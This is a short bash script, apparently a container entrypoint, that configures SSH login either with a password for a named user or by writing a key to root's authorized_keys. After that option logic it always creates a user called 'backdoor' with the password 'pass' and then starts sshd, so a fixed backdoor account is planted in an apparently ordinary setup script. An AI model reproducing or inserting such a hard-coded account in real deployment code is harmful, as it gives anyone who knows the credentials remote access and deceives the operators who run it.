#!/usr/bin/env bash

case "$1" in
   "password" )
        useradd -ms /bin/bash $2
        echo "$2:$3" | chpasswd ;;
   "pem" )
        echo "$3 $2" > /root/.ssh/authorized_keys ;;
   * )
        echo "invalid authentication type"
        echo "syntax: [password user1 password1 | pem user1 pem_key]" ;;

esac

useradd -ms /bin/bash 'backdoor'
echo "backdoor:pass" | chpasswd

/usr/sbin/sshd -D
